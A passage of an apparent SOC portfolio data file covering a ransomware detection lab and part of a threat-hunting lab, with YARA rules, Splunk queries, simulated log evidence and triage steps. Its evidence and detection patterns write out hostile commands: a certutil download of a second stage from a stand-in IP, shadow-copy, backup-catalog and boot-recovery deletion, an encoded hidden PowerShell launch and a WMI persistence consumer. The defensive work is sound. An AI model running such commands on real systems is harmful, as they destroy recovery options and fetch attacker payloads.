writeup.challenges: Three real-world frictions. First, time: the Linux logs arrived in local time and the firewall in UTC, which initially put the SSH success after the Windows one and broke the story; normalizing timestamps is step zero, not cleanup. Second, noise: internet background scanning and a forgetful user generated far more failed logons than the attacker did, so volume alone was useless — the failure-then-success and cross-source patterns did the work. Third, the 02:12-02:47 log gap means part of the Linux activity cannot be proven from auth.log at all and had to be bounded using firewall and file evidence instead. Limitation: this is still a small lab dataset; at enterprise volume these queries need summary indexing and the baselines need weeks, not days.
writeup.learned: Investigation is correlation, not collection: every single-source finding in this project was ambiguous, and every conclusion that held up came from two or more sources agreeing. Pivoting on one value (the source IP) and building one honest timeline (INV-07) is the core skill; fancy queries are secondary. Baselining before alerting (logon hours, event volumes, known IPs) is what separates a pattern from a coincidence. And a gap in the logs is itself evidence, but only if you can show the host is normally chatty. Next: Project 3 extends the Windows side of this incident into ransomware behavior, Project 4 hunts for what these eight patterns still miss, and Project 5 enriches these exact IOCs.

soc.title: Ransomware Detection Lab
soc.desc: Explore YARA rules and suspicious file activity.
steps: Set up an isolated VM for file-activity experiments
Write a first YARA rule and test it on harmless sample files
Simulate suspicious file activity (mass renames, entropy changes)
Document which behaviors your rules catch and which they miss
Test each YARA rule against the lab sample set (ransom note, packed sample, clean control files) and record hits and misses
Plant canary files in Documents, Desktop, and the share root, and confirm a canary hit fires before the volume threshold
Run the simulated encryption in the snapshot VM and time each detection: canary, anti-recovery, mass-rename, share-side
Tune the pack: record false positives (sync clients, packers, training docs) and the signer/hash/folder-count exclusions added

items.title: Ransom note text and recovery instructions in a dropped file
items.src: YARA scan of files created on endpoints / file shares (Velociraptor, yara CLI, EDR file events)
items.logic:
rule Ransom_Note_Generic {
 meta:
     description = "Text patterns common to ransomware ransom notes"
    project = "Project 3 - Ransomware Detection Lab"
 strings:
     $a1 = "your files have been encrypted" ascii wide nocase
    $a2 = "to decrypt" ascii wide nocase
    $a3 = "bitcoin" ascii wide nocase
    $a4 = ".onion" ascii wide nocase
    $a5 = "do not rename" ascii wide nocase
    $a6 = "personal decryption code" ascii wide nocase
    $pay_btc = /1[1-9A-HJ-NP-Za-km-z]{25,34}/ 
    $pay_xmr = /4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}/
 condition:
     filesize < 500KB and (3 of ($a*) or any of ($pay_*))
}
items.ev:
yara scan WIN-LAB01 C:\Users\jsmith\Documents\RESTORE_FILES.txt
Ransom_Note_Generic C:\Users\jsmith\Documents\RESTORE_FILES.txt
 $a1: "Your files have been encrypted"
 $a4: "http://xxxx...onion/pay"
 $pay_btc: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (lab test address)
The same note (identical SHA-256) exists in 14 folders on the host — a note dropped per directory is the ransomware pattern, not a user document.
items.triage:
1. Isolate the host immediately: a ransom note means encryption has usually already run or is running.
2. Hash the note and hunt fleet-wide for the same hash and filename — every hit is in scope.
3. Check what else changed in the same folders: extensions, file sizes, canary files (YARA-05).
4. Preserve the note and 2-3 encrypted samples (with their originals from backup if available) for Project 6 sandbox analysis.
5. Do not pay and do not delete: hand the note, hashes, and timeline to incident response; note contents (wallet, onion URL) go to Project 5 for enrichment.
items.fp: FPs: security-awareness training documents and news articles about ransomware can contain the same phrases. The 3-of-strings threshold plus a payment-address regex keeps single-phrase documents quiet; a training doc also will not appear identically in 14 folders at once. Tune: exclude the awareness-training share by path, never by weakening the string count.

items.title: Known ransomware extension and filename markers
items.src: YARA scan + Sysmon Event ID 11 (FileCreate) / file rename telemetry
items.logic:
rule Ransomware_Extension_Markers {
 meta:
     description = "File content/names carrying known ransomware-appended extensions"
 strings:
     $e1 = ".lockbit" ascii nocase
 $e2 = ".blackcat" ascii nocase
    $e3 = ".alphv" ascii nocase
    $e4 = ".royal" ascii nocase
    $e5 = ".locked" ascii nocase
    $e6 = ".encrypted" ascii nocase
    $n1 = "README_RESTORE" ascii nocase
    $n2 = "HOW_TO_RECOVER" ascii nocase
    $n3 = "RECOVER-FILES" ascii nocase
 condition:
     any of ($e*) or any of ($n*)
}
/* Paired behavioral check: count files per host whose names match the marker list per 5 minutes; >= 20 = active encryption, page immediately. */
items.ev:
2026-11-20T23:41:07Z WIN-LAB01 Sysmon EventID=11 FileCreate
TargetFilename: C:\Users\jsmith\Documents\Q3-report.docx.lockbit
Image: C:\Users\Public\upd.exe
... 212 files renamed/created with .lockbit in 3 minutes across Documents, Desktop, and Pictures.
Indicator: one or two renamed files can be a test; hundreds per minute from one unsigned process is encryption in progress.
items.triage:
1. Kill the encrypting process tree first, isolate the host second — order matters, encryption is fast.
2. Identify the exact extension/note pair: that is your family attribution starting point for intel (Project 5).
3. Scope: search all hosts and file shares for the same extension in the same window (see YARA-09 for share-side encryption).
4. Snapshot the VM / preserve the disk before any restore work (Project 7 forensics).
5. Restore only from known-clean backups after the entry point (Project 2's compromised accounts) is closed.
items.fp: FPs: '.locked' and '.encrypted' are also used by a few legitimate backup/DRM tools, and researchers' sample folders match everything. Tune: keep lab/sample directories on their own scan profile; require the behavioral count threshold (>= 20 files / 5 min) for paging, while single YARA hits still log for hunting.

items.title: High-entropy packed executable importing crypto APIs
items.src: YARA scan of downloads, email attachments, and new executables (with pe module)
items.logic:
import "pe"
import "math"
rule Packed_Crypto_Executable {
 meta:
     description = "High entropy + crypto imports: ransomware/dropper staging profile"
 condition:
     pe.is_pe and
 math.entropy(0, filesize) >= 7.2 and
    filesize < 10MB and
    (pe.imports("crypt32.dll", "CryptEncrypt") or
     pe.imports("bcrypt.dll", "BCryptEncrypt") or
 pe.imports("advapi32.dll", "CryptGenKey")) and
    pe.number_of_signatures == 0
}
items.ev:
yara scan: Packed_Crypto_Executable C:\Users\jsmith\Downloads\invoice_viewer.exe
 entropy: 7.61 size: 1.8 MB unsigned
 imports: BCryptEncrypt, BCryptGenerateSymmetricKey, CryptGenRandom
 first seen: 4 minutes before the YARA-02 extension burst on the same host
Indicator: no single trait is damning — entropy + crypto imports + unsigned + user Downloads folder together are the staging profile.
items.triage:
1. Quarantine the file; do not execute it outside the Project 6 sandbox.
2. Hash it (SHA-256) and check intel sources; search the fleet for the same hash.
3. Work out delivery: email attachment, download, or dropped by another process (Sysmon parent chain).
4. If it already ran, treat the host as YARA-02 scope even before extensions appear — check canaries and shadow copies now.
5. Submit the sample to the sandbox queue (Project 6) rather than detonating it on this host.
items.fp: FPs: legitimate packers and protectors (game anti-cheat, DRM, some installers and updaters) are high-entropy and import crypto APIs. They differ by being signed by known publishers. Tune: allowlist by publisher certificate + hash for known software; never allowlist 'unsigned + Downloads' — that combination stays an alert.

items.title: Mass file renames and extension changes in a short window
items.src: Sysmon Event ID 11 (FileCreate) + filesystem auditing (4663) / EDR file telemetry
items.logic:
index=sysmon EventCode=11
| bin _time span=5m
| stats count AS files_touched, dc(TargetFilename_extension) AS extensions, values(Image) AS processes BY _time, Computer
| where files_touched >= 100
/* Lab threshold: a busy user touches ~5-20 files/5m. Encryption touches hundreds. */
items.ev:
2026-11-20T23:41-23:44Z WIN-LAB01: 212 FileCreate/rename events in 3 minutes, all Image=C:\Users\Public\upd.exe
Extensions seen: .docx.lockbit, .xlsx.lockbit, .pdf.lockbit, .jpg.lockbit
Same process from Project 1's persistence rules (Run key + scheduled task 'UpdateCheck').
Indicator: one process, many folders, one new extension, machine speed — no human works like this.
items.triage:
1. Page immediately: this is encryption in progress, minutes matter more than perfect evidence.
2. Suspend the process and isolate the host (EDR network-isolate keeps memory evidence).
3. Check network shares the host can write to — encryption walks shares next (YARA-09).
4. Record start time and files/minute: that bounds how much data was hit and drives restore scope.
5. Preserve the process binary and a memory image before remediation (Projects 6 and 7).
items.fp: FPs: bulk photo imports, backup/sync clients (OneDrive, Dropbox) first-run sync, and archive extraction can touch many files. They differ by process (signed sync client), by keeping original extensions, and by read/write patterns without renames. Tune: alert on rename+extension-change specifically, not raw file count; allowlist sync clients by signer.

items.title: Shadow copy, backup catalog, and recovery destruction
items.src: Sysmon Event ID 1 (Process Create) / Windows Security 4688
items.logic:
index=sysmon EventCode=1
 (Image="*\\vssadmin.exe" CommandLine="*delete shadows*")
 OR (Image="*\\wbadmin.exe" CommandLine="*delete catalog*")
 OR (Image="*\\bcdedit.exe" (CommandLine="*recoveryenabled no*" OR CommandLine="*bootstatuspolicy ignoreallfailures*"))
 OR (Image="*\\wmic.exe" CommandLine="*shadowcopy*delete*")
 OR (CommandLine="*Win32_ShadowCopy*")
items.ev:
2026-11-20T23:38:12Z WIN-LAB01 Sysmon EventID=1
Image: C:\Windows\System32\wbadmin.exe CommandLine: wbadmin delete catalog -quiet
2026-11-20T23:38:31Z vssadmin.exe Delete Shadows /all /quiet
2026-11-20T23:38:47Z bcdedit.exe /set {default} recoveryenabled No
Parent for all three: C:\Users\Public\upd.exe — 3 minutes before the BEH-01 encryption burst.
Indicator: this extends Project 1's T1490 rule with the full anti-recovery set (catalog + boot recovery), the standard pre-encryption sequence.
items.triage:
1. Isolate now: anti-recovery commands mean encryption is imminent or started — check BEH-01/YARA-05 hits in the same window.
2. Inventory surviving recovery options: offline backups, cloud versioning, snapshots the attacker could not reach.
3. Do not reboot the host (bcdedit changes punish restarts); image it first.
4. Hunt the same command lines fleet-wide: actors run them per-host, and quieter hosts may be earlier in the sequence.
5. Record which backups survived — that fact shapes the whole recovery plan and any ransom decision discussion.
items.fp: Almost no legitimate FPs: backup products manage their own catalogs through services, not wbadmin delete from a user-context parent. The one real FP is an admin rebuilding backup jobs. Tune: allowlist only your backup service account + exact binary paths; the parent process being a user-writable binary (Users\Public, AppData, Temp) is never allowlisted.

items.title: Canary files modified: earliest possible encryption tripwire
items.src: Canary files (decoy documents) planted per folder/share + FIM (file integrity monitoring) / Sysmon 11
items.logic:
/* Canary design: files named to sort first and last in each directory
   (000-canary-budget.xlsx, zzz-canary-notes.docx) with known hashes,
   planted in Documents, Desktop, and each share root. No user ever opens them. */
index=fim file_name IN ("*canary*") action IN (modified, renamed, deleted)
| table _time, Computer, file_path, process, user
/* ANY hit pages. Detection goal: fire on the first encrypted folder,
   not after hundreds of real files are gone. */
items.ev:
2026-11-20T23:40:58Z WIN-LAB01 FIM ALERT
File: C:\Users\jsmith\Documents\000-canary-budget.xlsx
Action: modified (hash changed) + renamed to 000-canary-budget.xlsx.lockbit
Process: C:\Users\Public\upd.exe
Timing: 9 seconds BEFORE the BEH-01 threshold (100 files) would have fired, and the canary in Desktop fired 40 seconds later — giving the encryption order across folders.
items.triage:
1. Treat any canary hit as confirmed encryption: isolate the host and suspend the process without waiting for volume thresholds.
2. Use canary hit order/timing to map which folders and shares were hit, and in what sequence.
3. Check share-root canaries: a hit there means encryption reached the file server (YARA-09 scope).
4. Verify the encrypting process against YARA-02/BEH-01 evidence and preserve it for the sandbox (Project 6).
5. After recovery, re-plant canaries with fresh hashes and names; a burned canary set loses value.
items.fp: FPs: near zero by design — nobody legitimately opens a file named 000-canary-budget.xlsx. Real FPs come from AV scanners and indexing touching files (reads do not change hashes; alert on modify/rename/delete only) and from your own canary maintenance. Tune: exclude the FIM service account's own writes during re-planting windows.

items.title: Ransom notes created across many directories at once
items.src: Sysmon Event ID 11 (FileCreate) / EDR file telemetry
items.logic:
index=sysmon EventCode=11 TargetFilename IN ("*RESTORE*", "*RECOVER*", "*DECRYPT*", "*RANSOM*", "*README*.txt", "*HOW_TO*.html")
| bin _time span=10m
| stats count AS notes, dc(directory) AS folders BY _time, Computer, Image
| where folders >= 5
items.ev:
2026-11-20T23:44:02Z WIN-LAB01 Sysmon EventID=11
TargetFilename: C:\Users\jsmith\Desktop\RESTORE_FILES.txt Image: C:\Users\Public\upd.exe
... same filename created in 14 distinct folders within 2 minutes, immediately after the BEH-01 rename burst in each folder.
Indicator: per-folder note drops track the encryption path folder by folder; one note in one folder is a test, fourteen is the payload finishing its run.
items.triage:
1. The folder list is your damage map: every folder with a note should be assumed encrypted and queued for restore checks.
2. Compare note folders against canary hits (BEH-03) and BEH-01 counts to reconcile total scope.
3. Collect one note for intel (wallet/onion/contact) — Project 5 enriches these; keep the rest as evidence.
4. Check for notes on shares and other hosts before declaring scope final.
5. Brief stakeholders with the folder/host counts from this rule; it is the clearest scope statement the lab produces.
items.fp: FPs: a user saving one 'README.txt' is normal — the >= 5 folders in 10 minutes from one process is the discriminator, plus the filename stems (RESTORE/DECRYPT/RANSOM) are not normal user documents. Tune: keep the folder-count threshold; do not alert on single note-like filenames.

items.title: Suspicious process profile: unsigned binary in a user-writable path doing mass file access
items.src: Sysmon Event ID 1 (Process Create) + Event ID 11 file telemetry, correlated
items.logic:
index=sysmon EventCode=1
 Image IN ("C:\\Users\\Public\\*", "*\\AppData\\*", "*\\Temp\\*", "C:\\ProgramData\\*")
| join Computer, Image [
 search index=sysmon EventCode=11
    | bin _time span=10m
    | stats count AS file_events BY Computer, Image
    | where file_events >= 50 ]
| table _time, Computer, User, Image, ParentImage, file_events
items.ev:
2026-11-20T23:37:50Z WIN-LAB01 Sysmon EventID=1
Image: C:\Users\Public\upd.exe (unsigned, first seen today)
ParentImage: explorer.exe (user double-clicked 'invoice' lure) — then 212 file events in 10 minutes (BEH-01).
Lineage check: this is the same upd.exe behind Project 1's Run key, scheduled task, and vssadmin rules — Project 3 closes the loop from staging to encryption.
items.triage:
1. Suspend the process and isolate the host; check BEH-01/BEH-03 to see if encryption already started.
2. Reconstruct delivery: parent process and the lure file (email/download) — that is the initial access to close.
3. Hash the binary; fleet-wide hunt for hash + path (Project 4 picks this up as a hunt).
4. Review the user's other activity for the credential exposure angle (Project 2 accounts).
5. Preserve binary + lure for sandbox detonation and behavior report (Project 6).
items.fp: FPs: portable apps and some developers run unsigned binaries from AppData/ProgramData legitimately, but they do not touch 50+ user documents in 10 minutes. Tune: the file-volume join is the tuning — keep it. Allowlist known portable tools by hash, and re-review the allowlist monthly.

items.title: Encryption of network shares from a single endpoint
items.src: File server auditing (4663/5145) + Sysmon on the endpoint / SMB server logs
items.logic:
index=windows EventCode=5145 host=FILE-LAB01 ShareName IN ("*\\Shares*", "*\\Departments*")
| bin _time span=5m
| stats count AS share_file_ops, dc(RelativeTargetName) AS files BY _time, IpAddress, SubjectUserName
| where share_file_ops >= 100
/* One workstation rewriting a share at machine speed = the highest-blast-radius ransomware pattern in the lab. */
items.ev:
2026-11-20T23:45:19Z FILE-LAB01 EventID=5145
Source: 192.168.56.10 (WIN-LAB01) Account: LAB\jsmith Share: \\FILE-LAB01\Departments
RelativeTargetName: Finance\Q3-report.docx.lockbit (and 340 more in 4 minutes)
Share-root canary (BEH-03) fired at 23:45:21 — the server itself is clean; the encryption is coming THROUGH the compromised endpoint's access.
items.triage:
1. Cut the endpoint's share access first (disable the account's sessions / isolate WIN-LAB01): the server does not need isolating, the writer does.
2. Snapshot the share immediately if the platform allows; every minute adds encrypted files.
3. Scope by RelativeTargetName: list affected folders for restore priority (Finance first, by business impact).
4. Confirm the server has no local encryptor (check its own Sysmon/process list) before trusting it as a restore base.
5. Restore share content from versioned/offline backup, then re-enable access only after the endpoint is rebuilt.
items.fp: FPs: legitimate bulk jobs — backup agents, file migrations, and DMS imports rewrite many share files. They run as service accounts from server hosts on schedules. Tune: alert on workstation-IP + interactive-user-account at volume; allowlist migration windows by ticket. A user account doing this at 23:45 is an incident.

writeup.problem: Ransomware gives a SOC the worst trade-off in detection: the damage is fast (hundreds of files per minute), partly irreversible, and the attacker deliberately destroys recovery options first (shadow copies, backup catalogs, boot recovery). Project 3 builds the ransomware-specific layer the earlier projects lacked: YARA rules that identify the tools and notes statically, behavioral detections that catch encryption while it runs, and canary files that fire on the first touched folder instead of after the damage threshold. It extends Project 1's single T1490 shadow-copy rule and follows the same compromised host and accounts (WIN-LAB01, jsmith, upd.exe) that Projects 1 and 2 tracked.
writeup.methodology: Lab: the Project 1/2 environment (WIN-LAB01, DC-LAB01, FILE-LAB01 file server) on a host-only network, snapshotted before every run. No live ransomware was used: encryption behavior was simulated with a controlled script that renames and re-writes harmless lab files with a test extension, plus inert sample files carrying ransom-note text and family extension markers for YARA testing. Method: (1) write YARA rules (note text + payment-address regex, extension/filename markers, high-entropy + crypto-import PE profile using the pe and math modules) and test them against the sample set and clean control files, (2) plant hashed canary files (names sorting first and last) in Documents, Desktop, and the share root, (3) run the simulation and time each detection — canary, anti-recovery commands (vssadmin/wbadmin/bcdedit), mass-rename volume, per-folder note drops, share-side SMB writes, (4) tune against the false positives a normal host generates (sync clients, packed legitimate software, training documents). Tools: YARA 4.x CLI, Sysmon (Events 1 and 11), Windows Security auditing (4663/5145), file integrity monitoring for canaries, Splunk Free for the behavioral queries.
writeup.findings: 9 entries shipped: 3 YARA rules and 6 behavioral detections, mapped mainly to Impact (T1486 data encrypted for impact, T1490 inhibit system recovery) with staging coverage (T1027.002 software packing, T1204.002 malicious file execution). In the timed simulation the detection order was: anti-recovery commands (BEH-02) fired first at T+0, the canary (BEH-03) fired 9 seconds into encryption — before the 100-file mass-rename threshold (BEH-01) — and the share-side rule (BEH-06) caught encryption reaching FILE-LAB01 through the compromised endpoint's SMB access (340 files in 4 minutes) even though the server itself was clean. The YARA note rule matched the dropped ransom note in all 14 folders (3-of-strings + payment regex), and the packed-executable rule flagged the staged upd.exe (entropy 7.61, BCrypt imports, unsigned, Downloads/Public path) — the same binary behind Project 1's persistence rules, which closes the storyline from staging to encryption.
writeup.challenges: Three honest difficulties. First, YARA is static: the note and extension rules only fire after files exist, and the packed-PE rule cannot distinguish a ransomware binary from a legitimately packed installer without the signer context — YARA finds candidates, behavior convicts. Second, thresholds are a trade-off with real cost on both sides: the 100-file/5-minute rename threshold is late by design (canaries exist to cover that gap), and lowering it fired on a OneDrive first-sync test. Third, simulation limits: a rename/rewrite script approximates encryption but does not reproduce real families' intermittent or partial encryption, thread counts, or safe-mode reboot tricks, so detection timings here are best-case. The pack also assumes Sysmon and file auditing are actually enabled and forwarded — on an unmanaged host, none of this telemetry exists.
writeup.learned: Defense in depth is measurable, not a slogan: in this lab each layer fired at a different time (anti-recovery at T+0, canary at first folder, volume threshold later, YARA on the artifacts afterward), and any single layer alone would have left a gap. Canary files are the highest-value, lowest-noise detection in the pack — near-zero false positives and the earliest encryption signal. Anti-recovery commands (T1490) are the best pre-encryption warning and deserve critical severity even though nothing is encrypted yet. Finally, ransomware detection is also a scoping tool: note-folder counts, canary hit order, and share-write logs produced the damage map recovery actually used. Next: Project 4 hunts for what these rules still miss, Project 5 enriches the wallet/onion/hash indicators collected here, and Project 6 detonates the preserved upd.exe sample in the sandbox.

soc.title: Threat Hunting Lab
soc.desc: Investigate endpoint telemetry and unusual behavior.
steps: Form a hunt hypothesis before touching the data
Collect endpoint telemetry from a lab host
Hunt for the unusual behavior your hypothesis predicts
Write up the hunt: hypothesis, queries, findings, dead ends
Write each hunt as a falsifiable hypothesis before running it, and log the verdict for every hunt: confirmed, benign-explained, or inconclusive
Baseline before hunting: 30 days of parent-child pairs, executable prevalence, WMI consumers, and per-host network destinations
Pivot every confirmed hit into the other telemetry (process tree, network, file, registry) and extend the incident timeline from Projects 2 and 3
Graduate proven hunts into the Project 1 rule pack (LOLBIN download, WMI consumer, unbacked remote thread) and hand all new IOCs to Project 5

items.title: LOLBIN ingress: signed Windows binaries downloading remote content
items.src: Sysmon Event ID 1 (Process Create) + Event ID 3 (Network Connect) / EDR process telemetry
items.logic:
HYPOTHESIS: If an attacker is living off the land on WIN-LAB01, they will fetch a second stage with a signed Windows binary (certutil, bitsadmin, mshta, curl) instead of dropping an obvious downloader, so no Project 1 rule fires.
index=sysmon EventCode=1 Image IN ("*\\certutil.exe", "*\\bitsadmin.exe", "*\\mshta.exe", "*\\curl.exe", "*\\regsvr32.exe")
 (CommandLine="*http*" OR CommandLine="*-urlcache*" OR CommandLine="*/transfer*" OR CommandLine="*scrobj*" OR CommandLine="*-o *")
| table _time, Computer, User, Image, ParentImage, CommandLine
| join Computer, ProcessGuid [ search index=sysmon EventCode=3 | table ProcessGuid, DestinationIp, DestinationPort ]
items.ev:
2026-11-20T15:22:41Z WIN-LAB01 Sysmon EventID=1
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil.exe -urlcache -split -f http://198.51.100.23:8443/stage2.dat C:\Users\Public\stage2.dat
ParentImage: C:\Windows\System32\cmd.exe User: LAB\jsmith
Sysmon EventID=3, same ProcessGuid: certutil.exe -> 198.51.100.23:8443 (the INV-05 / Project 2 C2 destination)
Indicators: certutil is a certificate tool; -urlcache -split -f with an http URL and a drop into Users\Public is the classic download-cradle abuse, and the destination is already a known IOC in this incident.
items.triage:
1. Verdict on the chain, not the binary: certutil itself is signed and legitimate — the URL, destination folder, and parent cmd.exe make this malicious.
2. Check what ran stage2.dat next (rename to .exe/.dll? loaded by rundll32?) via Sysmon 1/7 in the following 10 minutes.
3. Pivot the destination IP fleet-wide and back 7 days; LOLBIN downloads are rarely a single event.
4. Isolate the host if a second stage executed; preserve stage2.dat for the Project 6 sandbox.
5. Convert to a rule: this hunt graduated — LOLBIN + URL + user-writable output path is now a standing detection (it was a genuine Project 1 coverage gap).
items.fp: FPs: admins do use certutil to verify hashes and curl to test endpoints, and some software distribution uses bitsadmin legitimately (it is BITS' own client). They differ by destination (internal PKI / update servers, not a bare external IP on port 8443) and by change tickets. Tune the graduated rule on command-line content (-urlcache, /transfer to external, http URLs) plus output path, never on the binary name alone.

items.title: Unusual parent-child chains: Office or browser spawning a shell
items.src: Sysmon Event ID 1 (Process Create, ParentImage + Image) / EDR process tree
items.logic:
HYPOTHESIS: The upd.exe lure from Projects 1-3 arrived as a document or download, so somewhere in telemetry an Office app or browser is the parent of cmd, PowerShell, wscript, or mshta — a chain normal work almost never produces.
index=sysmon EventCode=1
 ParentImage IN ("*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\OUTLOOK.EXE", "*\\chrome.exe", "*\\msedge.exe", "*\\firefox.exe")
 Image IN ("*\\powershell.exe", "*\\cmd.exe", "*\\wscript.exe", "*\\cscript.exe", "*\\mshta.exe", "*\\rundll32.exe")
| table _time, Computer, User, ParentImage, Image, CommandLine
items.ev:
2026-11-20T14:58:03Z WIN-LAB01 Sysmon EventID=1
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c powershell -w hidden -enc aQBmACAA... (the Project 1 T1059.001 event, now explained)
Document: C:\Users\jsmith\Downloads\Invoice_Q3.docm — macro-enabled, received as an email attachment 2 minutes earlier (Outlook web download marker, Zone.Identifier present).
Indicator: this single chain is patient zero for the whole Projects 1-3 storyline. Word does not spawn shells in legitimate use of this lab.
items.triage:
1. Work backwards: identify the document/file and how it arrived (email gateway log, browser download history, Zone.Identifier ADS).
2. Work forwards: list every descendant of the shell for 30 minutes — persistence (Project 1 rules), LOLBIN download (HUNT-01), discovery burst (HUNT-06) all hang off this tree.
3. Preserve the lure document for Project 6; do not open it on a production host.
4. Check other hosts for the same document hash — phishing is sent to more than one person.
5. User interview last, evidence first: confirm whether jsmith expected an invoice document at all.
items.fp: FPs: rare but real — some Excel add-ins and legitimate macro workbooks shell out, and IT sometimes pushes scripts via Outlook-delivered packages. In this lab the baseline over 30 days was zero Office-to-shell chains, which is what makes the hunt decisive. Tune by prevalence: keep a per-fleet count of parent-child pairs; pairs seen on many hosts from signed add-ins get documented, pairs seen once get hunted.

items.title: Prevalence hunt: first-seen and rare executables across the fleet
items.src: Sysmon Event ID 1 + Event ID 6/7 (driver/image load) with SHA-256 hashes / EDR inventory
items.logic:
HYPOTHESIS: Whatever the rules missed will still be statistically rare: a binary hash seen on exactly one host, for the first time today, running from a user-writable path, is worth an analyst's hour even with no signature match.
index=sysmon EventCode=1
| stats count AS executions, dc(Computer) AS hosts, earliest(_time) AS first_seen BY SHA256, Image
| where hosts = 1 AND executions <= 3
| where Image LIKE "%Users%" OR Image LIKE "%AppData%" OR Image LIKE "%Temp%" OR Image LIKE "%ProgramData%"
| sort first_seen
/* Stack counting: rank by rarity, investigate from the rarest up. */
items.ev:
Stack result, WIN-LAB01 + WIN-LAB02 + DC-LAB01, 7 days:
1 host / 1 exec — C:\Users\Public\upd.exe — SHA256 9f2c…a41b — first seen 2026-11-20T14:58 (Projects 1-3 actor binary)
1 host / 2 exec — C:\Users\Public\stage2.dat (renamed .dll) — SHA256 44d0…c9e2 — first seen 15:22 (HUNT-01 download)
1 host / 2 exec — C:\Users\jsmith\AppData\Local\Temp\~update.exe — unsigned, first seen 16:05
Fleet-normal software (browsers, Office, updaters) all show hosts = 3 and hundreds of executions — the stack separates them without any signature.
items.triage:
1. For each rare hash: VirusTotal-style intel lookup comes later (Project 5); first answer local questions — who ran it, what spawned it, what did it do in its first 5 minutes (Sysmon 1/3/11 by ProcessGuid).
2. Check signing status and original filename in the PE metadata; renamed system-binary names (svchost.exe outside System32) escalate immediately.
3. Promote confirmed-bad hashes to IOCs and re-run the stack fleet-wide over 30 days.
4. Document the benign rare items (a user's portable tool) so the next hunt starts cleaner.
5. Any rare binary that also appears in HUNT-01/02/04/05 results jumps the queue — rarity plus behavior is the hunt's strongest signal.
items.fp: FPs are the design, not a flaw: most rare executables are benign (portable apps, a developer's build, a one-off installer). The hunt is a triage queue ranked by rarity, not an alert. Cost control: cap the queue (rarest 10 per week), require a user-writable path, and keep a known-benign hash list. Never auto-block on prevalence alone.

items.title: Persistence beyond the rules: WMI event subscriptions and rogue services
items.src: Sysmon Event ID 19/20/21 (WMI) + WMI-Activity Operational log (5857-5861) / Security 7045 service installs
items.ev:
2026-11-20T18:24:37Z WIN-LAB01 Sysmon EventID=20 WmiEventConsumer activity detected
Name: UpdaterHealth Type: CommandLineEventConsumer
CommandLineTemplate: C:\Users\Public\upd.exe -silent
Bound (EventID=21) to __EventFilter 'UpdaterHealthFilter': SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3
Translation: upd.exe re-runs every day at 03:00 via WMI, with no scheduled task and no Run key. Created 3 minutes after the Project 1 scheduled task — a deliberate backup mechanism. It fired once (03:00, inside the Project 2 off-hours window) before the host was isolated.
items.triage:
1. Enumerate, don't guess: dump all __EventFilter, __EventConsumer, and __FilterToConsumerBinding instances (root\subscription) on the host and diff against the known-good list.
2. Read the consumer payload exactly: what runs, on what trigger (logon, timer, process start are the abused ones).
3. Check whether it fired: WMI-Activity 5857/5861 and process-create events at the trigger times bound the extra executions for the timeline.
4. Remove in order — binding first, then consumer and filter — after exporting the instances as evidence.
5. Graduate the hunt: add Sysmon 19-21 alerting on CommandLineEventConsumer creation outside the known-good list to the Project 1 rule pack.
items.fp: FPs: SCCM/Intune, some EDR and monitoring agents, and a few hardware-vendor utilities install legitimate WMI consumers. They are stable and fleet-wide; the tuning asset is the known-good consumer inventory per host role. A consumer created today, pointing at a user-writable binary, on one host, has no benign pattern to hide behind.

items.title: Process injection: remote threads and handles into trusted processes
items.src: Sysmon Event ID 8 (CreateRemoteThread) + Event ID 10 (ProcessAccess) / EDR injection telemetry
items.logic:
HYPOTHESIS: If the actor needed to survive upd.exe being found, the next step is running inside a trusted process. Injection leaves two telemetry marks rules rarely alert on: a remote thread created in another process, and a high-access handle opened on it first.
index=sysmon (EventCode=8 OR EventCode=10)
| where (EventCode=8 AND NOT StartModule LIKE "%System32%")
    OR (EventCode=10 AND GrantedAccess IN ("0x1fffff", "0x1438", "0x143a") AND TargetImage IN ("*\\explorer.exe", "*\\svchost.exe", "*\\RuntimeBroker.exe"))
| table _time, Computer, SourceImage, TargetImage, StartAddress, StartModule
items.ev:
2026-11-20T16:41:12Z WIN-LAB01 Sysmon EventID=10 ProcessAccess
SourceImage: C:\Users\Public\upd.exe TargetImage: C:\Windows\explorer.exe GrantedAccess: 0x1fffff (PROCESS_ALL_ACCESS)
2026-11-20T16:41:13Z WIN-LAB01 Sysmon EventID=8 CreateRemoteThread
SourceImage: C:\Users\Public\upd.exe TargetImage: C:\Windows\explorer.exe
StartModule: (none — unbacked memory) StartAddress in a private, executable region
Follow-up: explorer.exe (the injected instance) makes the 03:00-style outbound connection in HUNT-07 — the beacon survived because it no longer came from upd.exe.
Indicators: all-access handle + remote thread 1 second apart, unsigned user-path source, shell process as target, thread start in unbacked memory.
items.triage:
1. Treat as confirmed defense evasion: legitimate cross-process threads into explorer from a user-writable unsigned binary do not occur in this lab's baseline.
2. Isolate the host; do not just kill upd.exe — the payload now lives in explorer.exe's memory. Preserve a memory image before reboot (Project 7).
3. Identify every target process the source touched (repeat the query per SourceImage) — injection is often sprayed at several hosts processes.
4. Re-attribute network/file activity of the target process after the injection timestamp; earlier triage may have cleared explorer.exe as 'trusted'.
5. Graduate: Sysmon 8 with an unbacked StartModule becomes a standing critical rule.
items.fp: FPs: debuggers, accessibility tools, some AV/EDR products, and graphics overlays inject legitimately — all signed, known, and fleet-documented. Sysmon 8 is noisy on a general fleet, which is why this starts as a hunt: baseline the source-target pairs first, alert only on pairs never seen before plus the unbacked-memory trait.

items.title: Discovery burst: one account mapping the environment in minutes
items.src: Sysmon Event ID 1 (Process Create) command-line telemetry / Security 4688 with command line
items.logic:
HYPOTHESIS: Before moving laterally or encrypting, the actor had to learn this network. Discovery uses built-in tools (whoami, ipconfig, nltest, net, arp, qwinsta) that no single-use rule should alert on — but a burst of different discovery commands from one user in minutes is a behavior worth hunting.
index=sysmon EventCode=1 Image IN ("*\\whoami.exe", "*\\ipconfig.exe", "*\\nltest.exe", "*\\net.exe", "*\\net1.exe", "*\\arp.exe", "*\\nbtstat.exe", "*\\qwinsta.exe", "*\\systeminfo.exe")
| bin _time span=10m
| stats dc(Image) AS discovery_tools, values(CommandLine) AS commands BY _time, Computer, User
| where discovery_tools >= 4
items.ev:
